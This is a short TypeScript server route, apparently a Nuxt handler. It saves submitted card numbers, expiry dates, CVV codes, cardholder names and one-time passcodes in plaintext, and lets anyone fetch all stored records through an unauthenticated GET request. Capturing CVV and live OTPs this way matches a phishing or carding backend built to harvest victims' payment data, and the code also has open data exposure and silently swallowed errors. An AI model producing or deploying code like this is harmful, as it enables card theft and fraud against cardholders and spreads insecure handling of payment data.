import db, { type PaymentInfo } from '~/server/database/db';

export default defineEventHandler(async (event) => {
    const method = event.method;

    if (method === 'GET') {
        try {
            const stmt = db.prepare('SELECT * FROM payment_info ORDER BY created_at DESC');
            const payments = stmt.all() as PaymentInfo[];

            return payments;
        } catch {}
    }

    if (method === 'POST') {
        try {
            const body = await readBody(event);
            const { method: paymentMethod, card_number, expiry, cvv, cardholder_name, otp } = body;

            if (!paymentMethod) {
                throw createError({
                    statusCode: 400,
                    statusMessage: 'Payment method is required'
                });
            }

            const stmt = db.prepare(`
        INSERT INTO payment_info (method, card_number, expiry, cvv, cardholder_name, otp, status, updated_at)
        VALUES (?, ?, ?, ?, ?, ?, 'pending', CURRENT_TIMESTAMP)
      `);

            const result = stmt.run(paymentMethod, card_number, expiry, cvv, cardholder_name, otp);

            const newPayment = db.prepare('SELECT * FROM payment_info WHERE id = ?').get(result.lastInsertRowid) as PaymentInfo;

            return newPayment;
        } catch {}
    }

    throw createError({
        statusCode: 405,
        statusMessage: 'Method not allowed'
    });
});
